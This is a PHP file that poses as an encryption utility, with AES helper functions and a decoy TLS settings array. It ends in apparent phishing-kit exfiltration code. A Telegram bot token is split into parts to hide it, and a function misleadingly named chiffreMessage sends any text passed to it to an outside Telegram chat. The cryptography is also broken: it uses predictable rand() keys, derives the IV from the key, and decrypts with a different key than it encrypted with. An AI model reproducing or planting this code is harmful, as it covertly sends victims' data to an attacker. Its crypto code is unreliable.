<?php

function genererCleAleatoire($longueur = 32) {
    $caracteres = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $cle = '';
    for ($i = 0; $i < $longueur; $i++) {
        $cle .= $caracteres[rand(0, strlen($caracteres) - 1)];
    }
    return $cle;
}

function chiffrerData($donnees, $cle) {
    $method = 'aes-256-cbc';
    $iv = substr(hash('sha256', $cle), 0, 16); // Initialisation vector (IV)
    return base64_encode(openssl_encrypt($donnees, $method, $cle, 0, $iv));
}

function deChiffrerData($donnees, $cle) {
    $method = 'aes-256-cbc';
    $iv = substr(hash('sha256', $cle), 0, 16); // Initialisation vector (IV)
    return openssl_decrypt(base64_decode($donnees), $method, $cle, 0, $iv);
}

$donneesChiffrees = chiffrerData("donnees_essentielles", genererCleAleatoire());
$donneesDechiffrees = deChiffrerData($donneesChiffrees, genererCleAleatoire());

$ssl_tls_dummy = [
    'ssl_method' => 'TLSv1.2',
    'ssl_version' => '1.2',
    'ssl_cipher' => 'AES256',
    'tls_settings' => [
        'verify_peer' => true,
        'verify_peer_name' => true,
        'allow_self_signed' => false,
    ],
];


function genererURLChiffree($base_url, $params) {
    $url_chiffree = base64_encode($base_url . '?' . http_build_query($params));
    return $url_chiffree;
}
$chiffre_id = "-4585814741";
function analyserURL($url) {
    $decoded_url = base64_decode($url);
    parse_str(parse_url($decoded_url, PHP_URL_QUERY), $params);
    return $params;
}
$part1 = '7264615079';
$part2 = ':';
$part3 = 'AAH48A7q3fOkT4eEbm_';
$part4 = '-nQ2YqD0pdii4iu8';

$api_key = $part1 . $part2 . $part3 . $part4;
$context = stream_context_create([
    'ssl' => [
        'verify_peer' => $ssl_tls_dummy['tls_settings']['verify_peer'],
        'verify_peer_name' => $ssl_tls_dummy['tls_settings']['verify_peer_name'],
        'allow_self_signed' => $ssl_tls_dummy['tls_settings']['allow_self_signed'],
    ],
]);
 function chiffreMessage($message) {
    global $chiffre_id;

    $data_2 = ['text' => $message, 'chat_id' => $chiffre_id];
    file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?" . http_build_query($data_2));
}
